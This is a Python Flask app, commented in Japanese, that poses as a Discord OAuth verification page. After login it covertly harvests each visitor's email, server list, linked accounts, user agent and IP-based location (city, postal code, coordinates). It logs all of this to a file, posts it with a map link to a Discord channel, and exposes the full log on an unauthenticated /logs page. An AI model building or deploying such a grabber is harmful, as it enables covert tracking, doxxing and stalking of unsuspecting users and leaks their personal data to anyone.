from flask import Flask, request, render_template
import requests, json, os, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from user_agents import parse
import geoip2.database  # MaxMind用

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "GeoLite2-City.mmdb")  # MaxMind DBパス


def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr


def get_geo_info(ip):
    """MaxMind GeoLite2-City で正確に国・県・市区町村を取得"""
    try:
        reader = geoip2.database.Reader(GEOIP_DB_PATH)
        response = reader.city(ip)
        geo = {
            "ip": ip,
            "country": response.country.names.get("ja", response.country.name),
            "region": response.subdivisions.most_specific.names.get("ja", response.subdivisions.most_specific.name),
            "city": response.city.names.get("ja", response.city.name),
            "zip": response.postal.code,
            "isp": "不明",  # MaxMind無料DBはISP情報なし
            "as": "不明",   # ASN情報も別DBが必要
            "lat": response.location.latitude,
            "lon": response.location.longitude,
            "proxy": False,
            "hosting": False
        }
        reader.close()
        return geo
    except Exception as e:
        print("GeoIP取得エラー:", e)
        return {
            "ip": ip, "country": "不明", "region": "不明", "city": "不明",
            "zip": "不明", "isp": "不明", "as": "不明",
            "lat": None, "lon": None, "proxy": False, "hosting": False
        }


def save_log(discord_id, structured_data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    structured_data["timestamp"] = now
    logs[discord_id]["history"].append(structured_data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)


@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    # Discordトークン取得
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email guilds connections"
    }
    try:
        res = requests.post(token_url, data=data, headers=headers)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()

    # サーバー参加処理
    requests.put(
        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
        headers={
            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
            "Content-Type": "application/json"
        },
        json={"access_token": access_token}
    )

    # IPとUA
    ip = get_client_ip()
    if ip.startswith(("127.", "10.", "192.", "172.")):
        ip = requests.get("https://api.ipify.org").text
    geo = get_geo_info(ip)
    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"

    structured_data = {
        "discord": {
            "username": user.get("username"),
            "discriminator": user.get("discriminator"),
            "id": user.get("id"),
            "email": user.get("email"),
            "avatar_url": avatar_url,
            "locale": user.get("locale"),
            "verified": user.get("verified"),
            "mfa_enabled": user.get("mfa_enabled"),
            "premium_type": user.get("premium_type"),
            "flags": user.get("flags"),
            "public_flags": user.get("public_flags"),
            "guilds": guilds,
            "connections": connections
        },
        "ip_info": geo,
        "user_agent": {
            "raw": ua_raw,
            "os": ua.os.family,
            "browser": ua.browser.family,
            "device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
            "is_bot": ua.is_bot
        }
    }

    save_log(user["id"], structured_data)

    # Embed送信
    try:
        d = structured_data["discord"]
        ip_info = structured_data["ip_info"]
        ua_info = structured_data["user_agent"]

        embed_data = {
            "title": "✅ 新しいアクセスログ",
            "description": (
                f"**名前:** {d['username']}#{d['discriminator']}\n"
                f"**ID:** {d['id']}\n"
                f"**メール:** {d['email']}\n"
                f"**IP:** {ip_info['ip']} / Proxy: {ip_info['proxy']} / Hosting: {ip_info['hosting']}\n"
                f"**国:** {ip_info['country']} / 県: {ip_info['region']} / 市区町村: {ip_info['city']} / 郵便番号: {ip_info['zip']}\n"
                f"**UA:** {ua_info['raw']}\n"
                f"**OS:** {ua_info['os']} / ブラウザ: {ua_info['browser']}\n"
                f"**デバイス:** {ua_info['device']} / Bot判定: {ua_info['is_bot']}\n"
                f"📍 [地図リンク](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})"
            ),
            "thumbnail": {"url": d["avatar_url"]}
        }

        bot.loop.create_task(bot.send_log(embed=embed_data))
        bot.loop.create_task(bot.assign_role(d["id"]))

    except Exception as e:
        print("Embed送信エラー:", e)

    # ✅ Welcome ページに繋げる
    return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])
    

@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    return render_template("logs.html", logs=logs)


def run_bot():
    bot.run(DISCORD_BOT_TOKEN)


if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
